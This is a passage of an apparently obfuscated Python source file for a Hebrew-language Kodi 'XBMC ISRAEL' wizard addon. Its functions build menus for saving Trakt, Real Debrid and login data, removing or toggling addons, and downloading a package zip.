	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0O0OOOO000OOO00 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת מקורות וידאו:  '%OOO00OOOO000OOO0O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO00000OOO000OOO0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00O0OO0OO0O00O00 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת פליליסט לאודר:  '%OOO000O0O00O0O00O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת הגדרות באפר: '%OO00OOOOO0O0O000O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת רשימות ריפו:  '%O00O0OO00OO0OOOO0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3154
	setView ('files','viewType')#line:3156
def traktMenu ():#line:3158
	O0OO00O0000OO0OO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3159
	OO0000OO00O0OO0O0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3160
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3161
	addFile ('Save Trakt Data: %s'%O0OO00O0000OO0OO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3162
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0000OO00O0OO0O0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3164
	for O0OO00O0000OO0OO0 in traktit .ORDER :#line:3166
		O000O00OO0OO0OO00 =TRAKTID [O0OO00O0000OO0OO0 ]['name']#line:3167
		O0O0O0OO0O0000O0O =TRAKTID [O0OO00O0000OO0OO0 ]['path']#line:3168
		OOOO00OO0OOOO0O0O =TRAKTID [O0OO00O0000OO0OO0 ]['saved']#line:3169
		O0O000O00OO000OOO =TRAKTID [O0OO00O0000OO0OO0 ]['file']#line:3170
		O0OOO0OOOO0000OO0 =wiz .getS (OOOO00OO0OOOO0O0O )#line:3171
		OOOOO00OOO00O0OOO =traktit .traktUser (O0OO00O0000OO0OO0 )#line:3172
		O000OO0000O0OOOOO =TRAKTID [O0OO00O0000OO0OO0 ]['icon']if os .path .exists (O0O0O0OO0O0000O0O )else ICONTRAKT #line:3173
		O0O0OOO00OO0OO00O =TRAKTID [O0OO00O0000OO0OO0 ]['fanart']if os .path .exists (O0O0O0OO0O0000O0O )else FANART #line:3174
		O0O000OOOOOOOO0O0 =createMenu ('saveaddon','Trakt',O0OO00O0000OO0OO0 )#line:3175
		O0OOOO0OO00O0O0O0 =createMenu ('save','Trakt',O0OO00O0000OO0OO0 )#line:3176
		O0O000OOOOOOOO0O0 .append ((THEME2 %'%s Settings'%O000O00OO0OO0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OO00O0000OO0OO0 )))#line:3177
		addFile ('[+]-> %s'%O000O00OO0OO0OO00 ,'',icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,themeit =THEME3 )#line:3179
		if not os .path .exists (O0O0O0OO0O0000O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0O000OOOOOOOO0O0 )#line:3180
		elif not OOOOO00OOO00O0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OO00O0000OO0OO0 ,icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0O000OOOOOOOO0O0 )#line:3181
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO00OOO00O0OOO ,'authtrakt',O0OO00O0000OO0OO0 ,icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0O000OOOOOOOO0O0 )#line:3182
		if O0OOO0OOOO0000OO0 =="":#line:3183
			if os .path .exists (O0O000O00OO000OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OO00O0000OO0OO0 ,icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0OOOO0OO00O0O0O0 )#line:3184
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OO00O0000OO0OO0 ,icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0OOOO0OO00O0O0O0 )#line:3185
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOO0OOOO0000OO0 ,'',icon =O000OO0000O0OOOOO ,fanart =O0O0OOO00OO0OO00O ,menu =O0OOOO0OO00O0O0O0 )#line:3186
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3188
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3189
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3190
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3191
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3192
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3193
	setView ('files','viewType')#line:3194
def realMenu ():#line:3196
	OOO000000OO0OO0O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3197
	O0O00O0OOOO00O0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3198
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3199
	addFile ('Save Real Debrid Data: %s'%OOO000000OO0OO0O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3200
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0O00O0OOOO00O0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3201
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3202
	for O00OOO00O0O000OOO in debridit .ORDER :#line:3204
		O0O00OOO00OO00OOO =DEBRIDID [O00OOO00O0O000OOO ]['name']#line:3205
		OOO0000000O0000O0 =DEBRIDID [O00OOO00O0O000OOO ]['path']#line:3206
		OO00000OOOO0OO00O =DEBRIDID [O00OOO00O0O000OOO ]['saved']#line:3207
		OOOOOOO00O000O000 =DEBRIDID [O00OOO00O0O000OOO ]['file']#line:3208
		OO0OO0O0O00000O0O =wiz .getS (OO00000OOOO0OO00O )#line:3209
		OO0OO0O000OOO0OOO =debridit .debridUser (O00OOO00O0O000OOO )#line:3210
		O00OOO0OO000OOO0O =DEBRIDID [O00OOO00O0O000OOO ]['icon']if os .path .exists (OOO0000000O0000O0 )else ICONREAL #line:3211
		O00O0O00O00O00O00 =DEBRIDID [O00OOO00O0O000OOO ]['fanart']if os .path .exists (OOO0000000O0000O0 )else FANART #line:3212
		OO0O0OOO00OOO0O00 =createMenu ('saveaddon','Debrid',O00OOO00O0O000OOO )#line:3213
		O0OO000O0O0OO0O0O =createMenu ('save','Debrid',O00OOO00O0O000OOO )#line:3214
		OO0O0OOO00OOO0O00 .append ((THEME2 %'%s Settings'%O0O00OOO00OO00OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00OOO00O0O000OOO )))#line:3215
		addFile ('[+]-> %s'%O0O00OOO00OO00OOO ,'',icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,themeit =THEME3 )#line:3217
		if not os .path .exists (OOO0000000O0000O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =OO0O0OOO00OOO0O00 )#line:3218
		elif not OO0OO0O000OOO0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00OOO00O0O000OOO ,icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =OO0O0OOO00OOO0O00 )#line:3219
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0O000OOO0OOO ,'authdebrid',O00OOO00O0O000OOO ,icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =OO0O0OOO00OOO0O00 )#line:3220
		if OO0OO0O0O00000O0O =="":#line:3221
			if os .path .exists (OOOOOOO00O000O000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00OOO00O0O000OOO ,icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =O0OO000O0O0OO0O0O )#line:3222
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00OOO00O0O000OOO ,icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =O0OO000O0O0OO0O0O )#line:3223
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OO0O0O00000O0O ,'',icon =O00OOO0OO000OOO0O ,fanart =O00O0O00O00O00O00 ,menu =O0OO000O0O0OO0O0O )#line:3224
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3226
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3227
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3228
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3229
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3230
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3231
	setView ('files','viewType')#line:3232
def loginMenu ():#line:3234
	OOOOO00O0O0000000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3235
	O0OOOOOO00O0OO0OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3236
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3237
	addFile ('Save Login Data: %s'%OOOOO00O0O0000000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3238
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOOOO00O0OO0OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3239
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3240
	for OOOOO00O0O0000000 in loginit .ORDER :#line:3242
		OO00OOOO0OOO00000 =LOGINID [OOOOO00O0O0000000 ]['name']#line:3243
		OO00O0O0O00OOOO00 =LOGINID [OOOOO00O0O0000000 ]['path']#line:3244
		OOO00000OO0000000 =LOGINID [OOOOO00O0O0000000 ]['saved']#line:3245
		O00O000O000OO000O =LOGINID [OOOOO00O0O0000000 ]['file']#line:3246
		OO0OOO0000O0O0OO0 =wiz .getS (OOO00000OO0000000 )#line:3247
		OOOOOOO0O0O00O0O0 =loginit .loginUser (OOOOO00O0O0000000 )#line:3248
		O00O0O0O000O00000 =LOGINID [OOOOO00O0O0000000 ]['icon']if os .path .exists (OO00O0O0O00OOOO00 )else ICONLOGIN #line:3249
		O0O00OO0000000O0O =LOGINID [OOOOO00O0O0000000 ]['fanart']if os .path .exists (OO00O0O0O00OOOO00 )else FANART #line:3250
		OOO00OOOOOOOOOO00 =createMenu ('saveaddon','Login',OOOOO00O0O0000000 )#line:3251
		O00O000O0OOO0OO0O =createMenu ('save','Login',OOOOO00O0O0000000 )#line:3252
		OOO00OOOOOOOOOO00 .append ((THEME2 %'%s Settings'%OO00OOOO0OOO00000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOOO00O0O0000000 )))#line:3253
		addFile ('[+]-> %s'%OO00OOOO0OOO00000 ,'',icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,themeit =THEME3 )#line:3255
		if not os .path .exists (OO00O0O0O00OOOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =OOO00OOOOOOOOOO00 )#line:3256
		elif not OOOOOOO0O0O00O0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOOO00O0O0000000 ,icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =OOO00OOOOOOOOOO00 )#line:3257
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOOOO0O0O00O0O0 ,'authlogin',OOOOO00O0O0000000 ,icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =OOO00OOOOOOOOOO00 )#line:3258
		if OO0OOO0000O0O0OO0 =="":#line:3259
			if os .path .exists (O00O000O000OO000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOOO00O0O0000000 ,icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =O00O000O0OOO0OO0O )#line:3260
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOOO00O0O0000000 ,icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =O00O000O0OOO0OO0O )#line:3261
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOO0000O0O0OO0 ,'',icon =O00O0O0O000O00000 ,fanart =O0O00OO0000000O0O ,menu =O00O000O0OOO0OO0O )#line:3262
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3264
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3265
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3266
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3267
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3268
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3269
	setView ('files','viewType')#line:3270
def fixUpdate ():#line:3272
	if KODIV <17 :#line:3273
		O000O0OOO0O000000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3274
		try :#line:3275
			os .remove (O000O0OOO0O000000 )#line:3276
		except Exception as OOOOO0OO0O0O00OOO :#line:3277
			wiz .log ("Unable to remove %s, Purging DB"%O000O0OOO0O000000 )#line:3278
			wiz .purgeDb (O000O0OOO0O000000 )#line:3279
	else :#line:3280
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3281
def removeAddonMenu ():#line:3283
	OO0OO0OO00O0OO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3284
	O0O0OOOO00O0O00OO =[];O000OO000OOO0O0O0 =[]#line:3285
	for OO0000O000O0O0OO0 in sorted (OO0OO0OO00O0OO0O0 ,key =lambda O00OO0O0O0O0O00OO :O00OO0O0O0O0O00OO ):#line:3286
		OOO000OOO00O00000 =os .path .split (OO0000O000O0O0OO0 [:-1 ])[1 ]#line:3287
		if OOO000OOO00O00000 in EXCLUDES :continue #line:3288
		elif OOO000OOO00O00000 in DEFAULTPLUGINS :continue #line:3289
		elif OOO000OOO00O00000 =='packages':continue #line:3290
		O00O0O0O0O0OO0OO0 =os .path .join (OO0000O000O0O0OO0 ,'addon.xml')#line:3291
		if os .path .exists (O00O0O0O0O0OO0OO0 ):#line:3292
			O0O0OOOO00O0O0O0O =open (O00O0O0O0O0OO0OO0 )#line:3293
			O0OO000OO0OO00000 =O0O0OOOO00O0O0O0O .read ()#line:3294
			OOOOOOO0O0OOO0O0O =wiz .parseDOM (O0OO000OO0OO00000 ,'addon',ret ='id')#line:3295
			OO0000000OOOOO0OO =OOO000OOO00O00000 if len (OOOOOOO0O0OOO0O0O )==0 else OOOOOOO0O0OOO0O0O [0 ]#line:3297
			try :#line:3298
				O00O0OOO0O0OOO0OO =xbmcaddon .Addon (id =OO0000000OOOOO0OO )#line:3299
				O0O0OOOO00O0O00OO .append (O00O0OOO0O0OOO0OO .getAddonInfo ('name'))#line:3300
				O000OO000OOO0O0O0 .append (OO0000000OOOOO0OO )#line:3301
			except :#line:3302
				pass #line:3303
	if len (O0O0OOOO00O0O00OO )==0 :#line:3304
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3305
		return #line:3306
	if KODIV >16 :#line:3307
		OOOOOO0OO00O0000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0OOOO00O0O00OO )#line:3308
	else :#line:3309
		OOOOOO0OO00O0000O =[];O0O00OO0000O00OOO =0 #line:3310
		OOO0O0OOO0O000OOO =["-- Click here to Continue --"]+O0O0OOOO00O0O00OO #line:3311
		while not O0O00OO0000O00OOO ==-1 :#line:3312
			O0O00OO0000O00OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0O0OOO0O000OOO )#line:3313
			if O0O00OO0000O00OOO ==-1 :break #line:3314
			elif O0O00OO0000O00OOO ==0 :break #line:3315
			else :#line:3316
				O0OOOO00OO0OO00O0 =(O0O00OO0000O00OOO -1 )#line:3317
				if O0OOOO00OO0OO00O0 in OOOOOO0OO00O0000O :#line:3318
					OOOOOO0OO00O0000O .remove (O0OOOO00OO0OO00O0 )#line:3319
					OOO0O0OOO0O000OOO [O0O00OO0000O00OOO ]=O0O0OOOO00O0O00OO [O0OOOO00OO0OO00O0 ]#line:3320
				else :#line:3321
					OOOOOO0OO00O0000O .append (O0OOOO00OO0OO00O0 )#line:3322
					OOO0O0OOO0O000OOO [O0O00OO0000O00OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0OOOO00O0O00OO [O0OOOO00OO0OO00O0 ])#line:3323
	if OOOOOO0OO00O0000O ==None :return #line:3324
	if len (OOOOOO0OO00O0000O )>0 :#line:3325
		wiz .addonUpdates ('set')#line:3326
		for O0OOO0O00000000OO in OOOOOO0OO00O0000O :#line:3327
			removeAddon (O000OO000OOO0O0O0 [O0OOO0O00000000OO ],O0O0OOOO00O0O00OO [O0OOO0O00000000OO ],True )#line:3328
		xbmc .sleep (1000 )#line:3330
		if INSTALLMETHOD ==1 :O0O000000000000OO =1 #line:3332
		elif INSTALLMETHOD ==2 :O0O000000000000OO =0 #line:3333
		else :O0O000000000000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3334
		if O0O000000000000OO ==1 :wiz .reloadFix ('remove addon')#line:3335
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3336
def removeAddonDataMenu ():#line:3338
	if os .path .exists (ADDOND ):#line:3339
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3340
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3341
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3342
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3343
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3344
		O000OOOOOOO000OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3345
		for OOOO00OO0OO000000 in sorted (O000OOOOOOO000OO0 ,key =lambda OOOOO0OOOO0OOO0OO :OOOOO0OOOO0OOO0OO ):#line:3346
			O000OO00O0OO00O0O =OOOO00OO0OO000000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3347
			OOOO0O00O00000OO0 =os .path .join (OOOO00OO0OO000000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3348
			O0OOO0OOOOO0OOOOO =os .path .join (OOOO00OO0OO000000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3349
			O0000OOO0OOOO000O =O000OO00O0OO00O0O #line:3350
			O0O0OOOO0OO0O0OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3351
			for OOOOOOO000O00OO00 in O0O0OOOO0OO0O0OOO :#line:3352
				O0000OOO0OOOO000O =O0000OOO0OOOO000O .replace (OOOOOOO000O00OO00 ,O0O0OOOO0OO0O0OOO [OOOOOOO000O00OO00 ])#line:3353
			if O000OO00O0OO00O0O in EXCLUDES :O0000OOO0OOOO000O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0000OOO0OOOO000O #line:3354
			else :O0000OOO0OOOO000O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0000OOO0OOOO000O #line:3355
			addFile (' %s'%O0000OOO0OOOO000O ,'removedata',O000OO00O0OO00O0O ,icon =OOOO0O00O00000OO0 ,fanart =O0OOO0OOOOO0OOOOO ,themeit =THEME2 )#line:3356
	else :#line:3357
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3358
	setView ('files','viewType')#line:3359
def enableAddons ():#line:3361
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3362
	O00000O0O0OOOO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3363
	OO000O0O0OOO0O00O =0 #line:3364
	for O0OO00O0O00OO0O0O in sorted (O00000O0O0OOOO000 ,key =lambda O00OOOOOOO0OO0000 :O00OOOOOOO0OO0000 ):#line:3365
		OO0OO0OO000OOO0OO =os .path .split (O0OO00O0O00OO0O0O [:-1 ])[1 ]#line:3366
		if OO0OO0OO000OOO0OO in EXCLUDES :continue #line:3367
		if OO0OO0OO000OOO0OO in DEFAULTPLUGINS :continue #line:3368
		OO0000OO0OO000000 =os .path .join (O0OO00O0O00OO0O0O ,'addon.xml')#line:3369
		if os .path .exists (OO0000OO0OO000000 ):#line:3370
			OO000O0O0OOO0O00O +=1 #line:3371
			O00000O0O0OOOO000 =O0OO00O0O00OO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3372
			OOO0000000000O0OO =open (OO0000OO0OO000000 )#line:3373
			O0O0OOOOO00O0000O =OOO0000000000O0OO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3374
			OOOO000000O00000O =wiz .parseDOM (O0O0OOOOO00O0000O ,'addon',ret ='id')#line:3375
			OO0000000OOOOO0O0 =wiz .parseDOM (O0O0OOOOO00O0000O ,'addon',ret ='name')#line:3376
			try :#line:3377
				O00OO000O000O0O00 =OOOO000000O00000O [0 ]#line:3378
				OOOOO0000OOOO00O0 =OO0000000OOOOO0O0 [0 ]#line:3379
			except :#line:3380
				continue #line:3381
			try :#line:3382
				OO000000O0O0000OO =xbmcaddon .Addon (id =O00OO000O000O0O00 )#line:3383
				O0OOOO0OOOO00OOOO ="[COLOR green][Enabled][/COLOR]"#line:3384
				OOOOOO00OO0O0O000 ="false"#line:3385
			except :#line:3386
				O0OOOO0OOOO00OOOO ="[COLOR red][Disabled][/COLOR]"#line:3387
				OOOOOO00OO0O0O000 ="true"#line:3388
				pass #line:3389
			OO00OOO0O00O0OOO0 =os .path .join (O0OO00O0O00OO0O0O ,'icon.png')if os .path .exists (os .path .join (O0OO00O0O00OO0O0O ,'icon.png'))else ICON #line:3390
			O0O0OOO00OO0O0OOO =os .path .join (O0OO00O0O00OO0O0O ,'fanart.jpg')if os .path .exists (os .path .join (O0OO00O0O00OO0O0O ,'fanart.jpg'))else FANART #line:3391
			addFile ("%s %s"%(O0OOOO0OOOO00OOOO ,OOOOO0000OOOO00O0 ),'toggleaddon',O00000O0O0OOOO000 ,OOOOOO00OO0O0O000 ,icon =OO00OOO0O00O0OOO0 ,fanart =O0O0OOO00OO0O0OOO )#line:3392
			OOO0000000000O0OO .close ()#line:3393
	if OO000O0O0OOO0O00O ==0 :#line:3394
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3395
	setView ('files','viewType')#line:3396
def changeFeq ():#line:3398
	O00OO0O0OO0OO0O0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3399
	OOO00OO0OO0OOO0OO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00OO0O0OO0OO0O0O )#line:3400
	if not OOO00OO0OO0OOO0OO ==-1 :#line:3401
		wiz .setS ('autocleanfeq',str (OOO00OO0OO0OOO0OO ))#line:3402
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00OO0O0OO0OO0O0O [OOO00OO0OO0OOO0OO ]))#line:3403
def developer ():#line:3405
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3406
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3407
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3408
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3409
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3410
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3411
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3412
	setView ('files','viewType')#line:3414
def download (O00OO0O0O0O00O00O ,O0OOO0OO0O00OOO0O ):#line:3419
  O0O0OO000O00OOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3420
  O0000O0O000000O0O =xbmcgui .DialogProgress ()#line:3421
  O0000O0O000000O0O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3422
  O00000O0O0OOOO0OO =os .path .join (O0O0OO000O00OOO00 ,'isr.zip')#line:3423
  OOOO00OOO0000OOOO =urllib2 .Request (O00OO0O0O0O00O00O )#line:3424
  O0000OO0OO0OO00OO =urllib2 .urlopen (OOOO00OOO0000OOOO )#line:3425
  O000000O000OO000O =xbmcgui .DialogProgress ()#line:3427
  O000000O000OO000O .create ("Downloading","Downloading "+name )#line:3428
  O000000O000OO000O .update (0 )#line:3429
  OOOO000OO000O0000 =O0OOO0OO0O00OOO0O #line:3430
  OOO000O0OO00OOOO0 =open (O00000O0O0OOOO0OO ,'wb')#line:3431
  try :#line:3433
    O0O00O0O00O0OOO0O =O0000OO0OO0OO00OO .info ().getheader ('Content-Length').strip ()#line:3434
    OO000O000000O00O0 =True #line:3435
  except AttributeError :#line:3436
        OO000O000000O00O0 =False #line:3437
  if OO000O000000O00O0 :#line:3439
        O0O00O0O00O0OOO0O =int (O0O00O0O00O0OOO0O )#line:3440
  O00000OO00OOO000O =0 #line:3442
  OOO00O0O0OOO0OOOO =time .time ()#line:3443
  while True :#line:3444
        O0OO00OO0OO0OO00O =O0000OO0OO0OO00OO .read (8192 )#line:3445
        if not O0OO00OO0OO0OO00O :#line:3446
            sys .stdout .write ('\n')#line:3447
            break #line:3448
        O00000OO00OOO000O +=len (O0OO00OO0OO0OO00O )#line:3450
        OOO000O0OO00OOOO0 .write (O0OO00OO0OO0OO00O )#line:3451
        if not OO000O000000O00O0 :#line:3453
            O0O00O0O00O0OOO0O =O00000OO00OOO000O #line:3454
        if O000000O000OO000O .iscanceled ():#line:3455
           O000000O000OO000O .close ()#line:3456
           try :#line:3457
